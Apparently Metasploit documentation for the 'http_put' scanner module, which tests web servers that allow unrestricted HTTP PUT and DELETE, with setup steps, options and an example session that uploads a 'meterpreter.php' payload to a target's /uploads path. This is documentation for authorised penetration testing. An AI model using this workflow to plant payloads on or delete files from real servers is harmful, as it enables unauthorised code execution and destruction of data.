## Vulnerable Application

This module targets web servers that allow HTTP PUT and DELETE methods without proper restrictions.

Improper configuration of HTTP PUT can allow attackers to upload arbitrary files to the server.
If executable files are uploaded, this may lead to:

- Arbitrary file upload
- Remote code execution
- Website defacement
- Unauthorized content modification

DELETE method misuse can allow attackers to remove existing files from the server.

To test this module:

1. Set up a web server (Apache, Nginx, IIS, etc.)
2. Ensure HTTP PUT/DELETE methods are enabled
3. Confirm lack of authentication or access control

## Verification Steps

1. Start Metasploit: `msfconsole`
2. Load the module: `use auxiliary/scanner/http/http_put`
3. Set options:
   - `set RHOSTS [IP]`
   - `set RPORT [PORT]`
   - `set PATH [PATH]`
   - `set FILENAME [FILENAME]`
   - `set FILEDATA [PATH]`
4. Run: `run`

If vulnerable, the module will confirm successful upload or deletion.

## Options

### ACTION

Set `ACTION` to either `PUT` or `DELETE`. Default is `PUT`.

### PUT

Uploads files to the server. If `FILENAME` is not specified, a random `.txt` file is generated.

### DELETE

Deletes the file specified in `FILENAME`.

### PATH

Target path for upload or deletion.

### FILEDATA

Content to upload when using PUT.

## Scenarios

Example usage with `ACTION` set to `PUT` (default):
```bash
msf > use auxiliary/scanner/http/http_put
msf auxiliary(scanner/http/http_put) > set RHOSTS 1.1.1.23
RHOSTS => 1.1.1.23
msf auxiliary(scanner/http/http_put) > set RPORT 8585
RPORT => 8585
msf auxiliary(scanner/http/http_put) > set PATH /uploads
PATH => /uploads
msf auxiliary(scanner/http/http_put) > set FILENAME meterpreter.php
FILENAME => meterpreter.php
msf auxiliary(scanner/http/http_put) > set FILEDATA file:/root/Desktop/meterpreter.php
FILEDATA => file:/root/Desktop/meterpreter.php
msf auxiliary(scanner/http/http_put) > run
[+] File uploaded: http://1.1.1.23:8585/uploads/meterpreter.php
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/http_put) >
```
